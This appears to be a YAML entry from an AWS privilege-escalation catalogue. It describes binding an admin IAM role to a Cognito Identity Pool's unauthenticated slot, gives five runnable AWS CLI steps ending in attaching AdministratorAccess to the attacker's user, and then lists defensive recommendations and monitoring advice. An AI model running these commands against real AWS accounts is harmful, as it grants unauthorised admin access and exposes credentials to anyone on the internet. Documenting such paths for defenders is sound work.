id: cognitoidentity-001
name: iam:PassRole + cognito-identity:SetIdentityPoolRoles
category: new-passrole
services:
  - iam
  - cognito-identity

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role to the Cognito Identity service
    - permission: cognito-identity:SetIdentityPoolRoles
      resourceConstraints: Must have access to the target identity pool ID
  additional:
    - permission: cognito-identity:ListIdentityPools
      resourceConstraints: Helpful for discovering existing identity pools to target
    - permission: cognito-identity:DescribeIdentityPool
      resourceConstraints: Useful for viewing identity pool configuration and current role assignments
    - permission: cognito-identity:GetIdentityPoolRoles
      resourceConstraints: Useful for verifying the current role assignments before and after exploitation
    - permission: iam:ListRoles
      resourceConstraints: Helpful for discovering available admin roles to pass
    - permission: iam:GetRole
      resourceConstraints: Useful for viewing role trust policies and confirming roles trust cognito-identity.amazonaws.com

description: A principal with `iam:PassRole` and `cognito-identity:SetIdentityPoolRoles` can bind an admin IAM role to an existing Cognito Identity Pool's unauthenticated identity slot. Once bound, any unauthenticated caller — including the attacker — can call `cognito-identity:GetId` and `cognito-identity:GetCredentialsForIdentity` (or `cognito-identity:GetOpenIdToken` + `sts:AssumeRoleWithWebIdentity`) to obtain temporary AWS credentials scoped to the admin role. This effectively turns the identity pool into a public, unauthenticated STS credential-vending endpoint. No separate execution environment (Lambda, EC2, container) is required; the attacker retrieves and uses the credentials directly.

prerequisites:
  admin:
    - An existing Cognito Identity Pool must be present with unauthenticated access enabled
    - A role must exist that trusts cognito-identity.amazonaws.com to assume it (with the sts:AssumeRoleWithWebIdentity action in its trust policy)
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - An existing Cognito Identity Pool must be present with unauthenticated access enabled
    - A role must exist that trusts cognito-identity.amazonaws.com and has elevated permissions

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws cognito-identity list-identity-pools \
          --max-results 60 \
          --query 'IdentityPools[*].{id:IdentityPoolId,name:IdentityPoolName}' \
          --output table
      description: Enumerate existing Cognito Identity Pools to find targets with unauthenticated access enabled.
    - step: 2
      command: |
        aws cognito-identity set-identity-pool-roles \
          --identity-pool-id IDENTITY_POOL_ID \
          --roles unauthenticated=arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE
      description: Bind the admin IAM role to the pool's unauthenticated identity slot via iam:PassRole. This returns HTTP 200 with an empty body on success. Any unauthenticated caller can now vend credentials for this role.
    - step: 3
      command: |
        IDENTITY_ID=$(aws cognito-identity get-id \
          --no-sign-request \
          --account-id ACCOUNT_ID \
          --identity-pool-id IDENTITY_POOL_ID \
          --query 'IdentityId' \
          --output text)

        echo "Identity ID: $IDENTITY_ID"
      description: Obtain a Cognito identity ID from the pool using --no-sign-request, demonstrating that no IAM credentials are required. Any internet caller can perform this step.
    - step: 4
      command: |
        OPENID_TOKEN=$(aws cognito-identity get-open-id-token \
          --no-sign-request \
          --identity-id IDENTITY_ID \
          --query 'Token' \
          --output text)

        aws sts assume-role-with-web-identity \
          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --role-session-name privesc-session \
          --web-identity-token $OPENID_TOKEN
      description: Use the Cognito identity to obtain an OpenID token (no credentials required), then exchange it for temporary admin role credentials via sts:AssumeRoleWithWebIdentity.
    - step: 5
      command: |
        AWS_ACCESS_KEY_ID=TEMP_KEY_ID \
        AWS_SECRET_ACCESS_KEY=TEMP_SECRET \
        AWS_SESSION_TOKEN=TEMP_TOKEN \
        aws iam attach-user-policy \
          --user-name STARTING_USER \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      description: Use the obtained temporary admin credentials to attach AdministratorAccess to the starting user.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative roles as Cognito unauthenticated identity roles** - Cognito unauthenticated identities are designed for anonymous app users; they should have extremely limited permissions (e.g., read access to specific public S3 objects), never administrative access.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificCognitoUnauthRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "cognito-identity.amazonaws.com"
      }
    }
  }
  ```

  - **Disable unauthenticated access on identity pools unless required** - Most Cognito Identity Pools for authenticated user flows do not need unauthenticated access enabled. Disabling it prevents this attack vector entirely.
  - **Monitor `cognito-identity:SetIdentityPoolRoles` calls** - This API is used infrequently and any unexpected call should be treated as a high-severity alert, especially if it modifies the unauthenticated role.
  - Monitor CloudTrail for identity pool role modifications that bind privileged roles to the unauthenticated slot
  - Alert on any `cognito-identity:SetIdentityPoolRoles` call outside of approved CI/CD processes
  - Regularly audit Cognito Identity Pools for administrative roles assigned to unauthenticated identity slots

limitations: |
  This path is unique among PassRole escalation paths in that no execution environment (Lambda, EC2, container, etc.) is required — the credential vending happens directly through Cognito's public STS endpoint. The attack persists until someone calls `SetIdentityPoolRoles` again to reassign the unauthenticated role, meaning the admin credential endpoint remains available to any internet caller until manually remediated.

